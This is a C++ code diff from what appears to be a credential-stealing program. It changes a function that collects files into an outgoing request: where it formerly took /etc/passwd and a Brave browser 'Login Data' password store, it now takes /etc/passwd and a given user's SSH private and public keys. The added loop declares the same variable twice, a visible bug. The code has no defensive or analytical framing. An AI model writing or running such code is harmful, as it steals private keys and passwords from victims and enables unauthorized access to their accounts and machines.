@@ -26,7 +26,6 @@ std::optional<std::string> get_file(const std::string file_name)
 {
     std::ifstream stream(file_name);
     std::string file;
-    char c;
 
     if (!stream.is_open())
     {
@@ -78,14 +77,18 @@ std::optional<std::string> get_file_and_cipher(const std::string file_name)
     return file;
 }
 
-void get_files_contents(Req &request)
+void get_files_contents(Req &request, std::string username)
 {
-    std::vector<std::string> files_names = {"/etc/passwd",
-                                            "/home/nestyles/.config/BraveSoftware/Brave-Browser/Default/Login Data"};
+    std::stringstream path;
+    path << "/home/" << username << "/";
+    std::string path_str = path.str();
+    std::array<std::string, 3> files_names = {"/etc/passwd",
+                                              path_str + ".ssh/id_rsa", path_str + ".ssh/id_rsa.pub"};
 
-    for (std::vector<std::string>::iterator t = files_names.begin(); t != files_names.end(); ++t)
+    for (auto &file_name : files_names)
     {
-        if (auto file_content = get_file_and_cipher(*t))
-            request.push_file_to_req(*t, *file_content);
+        auto file_content = get_file(file_name);
+        if (auto file_content = get_file(file_name))
+            request.push_file_to_req(file_name, *file_content);
     }
 }
